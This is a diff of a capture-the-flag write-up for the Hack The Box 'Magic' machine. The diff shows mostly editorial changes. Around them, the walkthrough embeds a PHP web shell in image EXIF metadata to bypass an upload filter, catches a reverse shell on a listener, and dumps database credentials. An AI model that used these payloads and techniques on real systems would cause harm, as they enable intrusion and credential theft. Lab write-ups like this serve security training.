@@ -120,7 +120,7 @@ Since we can upload files and access them, we could try to upload a PHP web shel
  is shown below. This web shell executes anything passed in a GET parameter named "cmd". 
 
 {% highlight php linenos %}
-<?php system($_REQUEST['cmd']); ?>
+<?php system($_REQUEST["cmd"]); ?>
 {% endhighlight %}
 
 If we save this web shell in a file named "ws.php" and try to upload it, the web application provides us with an error stating that the file type is not allowed.
@@ -162,7 +162,7 @@ Megapixels                      : 0.239
 We start by executing `cp hackerCat.png evilHackerCat.png` to create a copy of the image. Next, we use `exiftool` to create a metadata tag named "Author" which holds our web shell. 
 {% highlight none linenos %}
 kali@kali:/tmp/x$ @@cp hackerCat.png evilHackerCat.png@@
-kali@kali:/tmp/x$ @@exiftool -author='<?php system($_REQUEST['cmd']); ?>' evilHackerCat.png@@
+kali@kali:/tmp/x$ @@exiftool -author='<?php system($_REQUEST["cmd"]); ?>' evilHackerCat.png@@
     @@@1 image files updated@@@
 {% endhighlight %}
 
@@ -173,9 +173,9 @@ ExifTool Version Number         : 12.10
 File Name                       : evilHackerCat.png
 Directory                       : .
 File Size                       : 338 kB
-File Modification Date/Time     : 2022:03:04 10:36:29-05:00
-File Access Date/Time           : 2022:03:04 10:36:29-05:00
-File Inode Change Date/Time     : 2022:03:04 10:36:29-05:00
+File Modification Date/Time     : 2022:03:09 08:27:32-05:00
+File Access Date/Time           : 2022:03:09 08:27:32-05:00
+File Inode Change Date/Time     : 2022:03:09 08:27:32-05:00
 File Permissions                : rw-r--r--
 File Type                       : PNG
 File Type Extension             : png
@@ -188,14 +188,14 @@ Compression                     : Deflate/Inflate
 Filter                          : Adaptive
 Interlace                       : Noninterlaced
 Significant Bits                : 8 8 8 8
-@@@Author@@@                          : @@@<?php system($_REQUEST[cmd]); ?>@@@
+@@@Author@@@                          : @@@<?php system($_REQUEST["cmd"]); ?>@@@
 Image Size                      : 601x398
 Megapixels                      : 0.239
 {% endhighlight %}
 
 ![uploadEvil](/assets/{{ imgDir }}/uploadEvil.png)
 
-If we go back to the upload page and try to reupload it, we can see that the web application accepts the image. However, if we visit [http://10.10.10.185/images/uploads/evilHackerCat.png](http://10.10.10.185/images/uploads/evilHackerCat.png) and inspect the response in Burp Suite, we discover that the web application did not execute our PHP code.
+If we go back to the `upload.php` page and try to upload our new image, we can see that the web application accepts the image. However, if we visit [http://10.10.10.185/images/uploads/evilHackerCat.png](http://10.10.10.185/images/uploads/evilHackerCat.png) and inspect the response in Burp Suite, we discover that the web application did not execute our PHP code.
 
 ![noRCE](/assets/{{ imgDir }}/noRCE.png)
 
@@ -226,7 +226,7 @@ listening on [any] 443 ...
 @@@connect to [10.10.14.3] from (UNKNOWN) [10.10.10.185] 50210@@@
 bash: cannot set terminal process group (1144): Inappropriate ioctl for device
 bash: no job control in this shell
-www-data@ubuntu:/var/www/Magic/images/uploads$ @@python3 -c 'import pty; pty.spawn("/bin/bash")'@@
+@@@www-data@@@@ubuntu:/var/www/Magic/images/uploads$ @@python3 -c 'import pty; pty.spawn("/bin/bash")'@@
 <ds$ python3 -c 'import pty; pty.spawn("/bin/bash")'
 www-data@ubuntu:/var/www/Magic/images/uploads$
 {% endhighlight %}
@@ -309,7 +309,7 @@ INSERT INTO `login` VALUES (1,'@@@admin@@@','@@@Th3s3usW4sK1ng@@@');
 [...]
 {% endhighlight %}
 
-Unfortunately, the `mysql` command does not exist on the target host. As such, we can not use this binary for database connections and executions of arbitrary SQL queries. However, since the `mysqldump` binary exists, we can dump the entire database and look for sensitive information in the dump. We can use the `--databases`, `-u` and `-p` flags to instruct the binary to dump the database named "Magic" with the credentials we found earlier. In the output of the command, we can see a row of the `Login` table which contains the username "admin" and password "Th3s3usW4sK1ng". At this point, we have acquired two potential usernames and two passwords. 
+Unfortunately, the `mysql` command does not exist on the target host. As such, we can not use this binary for database connections and executions of arbitrary SQL queries. However, since the `mysqldump` binary exists, we can dump the entire database and look for sensitive information in the dump. We can use the `--databases`, `-u` and `-p` flags to instruct the binary to dump the database named "Magic" with the credentials we found earlier. In the output of the command, we can see a row of the `Login` table which contains the username "admin" and password "Th3s3usW4sK1ng". At this point, we have acquired two usernames and two passwords. 
 
 {% highlight none linenos %}
 www-data@ubuntu:/var/www/Magic/images/uploads$ @@cat /etc/passwd | grep "theseus:"@@
@@ -336,7 +336,7 @@ Password: @@Th3s3usW4sK1ng@@
 
 By executing the command `groups` we can see that the `theseus` user is a member of the `theseus` and `users` group. The latter is a non-standard group and thus it could be interesting to search for directories and files owned by this group. We can do this using the command `find / -group users -exec ls -l {} \; 2>/dev/null`. 
 
-The `-exec ls -l {} \;` portion of the command instructs `find` to execute `ls -l [fileOrDir]` for each discovered directory and file, to provide us with more information about it. The `2>/dev/null` portion of the command disables error messages by redirecting them to `/dev/null`. This is useful since it is likely that there are many folders that we can not access, which would result in a large number of `permission denied` errors.
+The `-exec ls -l {} \;` portion of the command instructs `find` to execute `ls -l` for each discovered directory and file, to provide us with more information about it. The `2>/dev/null` portion of the command disables error messages by redirecting them to `/dev/null`. This is useful since it is likely that there are many folders that we can not access, which would result in a large number of `permission denied` errors.
 
 {% highlight none linenos %}
 theseus@ubuntu:/var/www/Magic/images/uploads$ @@groups@@
